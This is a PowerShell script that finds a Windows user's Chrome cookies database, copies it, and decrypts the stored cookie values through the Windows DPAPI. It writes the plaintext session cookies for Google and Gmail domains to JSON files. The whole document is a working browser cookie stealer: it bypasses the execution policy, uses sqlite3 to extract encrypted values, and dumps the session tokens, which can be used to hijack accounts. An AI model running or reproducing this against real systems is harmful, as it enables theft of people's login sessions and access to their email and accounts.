Add-Type -AssemblyName System.Security
Set-ExecutionPolicy Bypass -Scope Process

$User=(Get-WMIObject -Class Win32_ComputerSystem).username -replace '.+\\'
$path=Get-ChildItem "C:\Users\$USER\AppData" "cookies" -Recurse #path to "cookies" file. Default install Google Chrome path C:\Users\%username%\AppData\..

$bak=$path.FullName+'_bak'
Copy-Item $path.FullName -Destination $bak -Force -Confirm:$false
$cookieLocation = $bak

function decrypt_cookie ($cookieAsEncryptedBytes) {
    $cookieAsBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($cookieAsEncryptedBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    $cookie = [System.Text.Encoding]::ASCII.GetString($cookieAsBytes)
    return $cookie
}

#$hostkey = "select host_key from cookies group by host_key" | .\sqlite3.exe $cookieLocation   #get all cookies
$hostkey = '.google.com', 'mail.google.com', 'accounts.gmail.com' # ... select sites

foreach ($hosts in $hostkey) {
    $filename = $hosts
    $names = "select name from cookies where host_key = '$hosts'" | .\sqlite3.exe $cookieLocation 
    foreach ($name in $names) {
        $tempFileName = [System.IO.Path]::GetTempFileName()
        $cooka = "select writefile('$tempFileName', encrypted_value) from cookies where host_key = '$hosts' and name = '$name'"
        $cooka | .\sqlite3.exe $cookieLocation 
        $cookieAsEncryptedBytes = Get-Content -Encoding Byte "$tempFileName"
        $decrypt_cookie = decrypt_cookie($cookieAsEncryptedBytes)
        $cookie = @{
            domain = "$hosts"
            name = "$name"
            path = "/"
            value = "$decrypt_cookie"
        }
        $json = ConvertTo-Json $cookie 
        $json = $json + ','
        $json | Out-File -Append ".\cookie\$hosts.txt"
        Remove-Item "$tempFileName"
}
}
Remove-Item $bak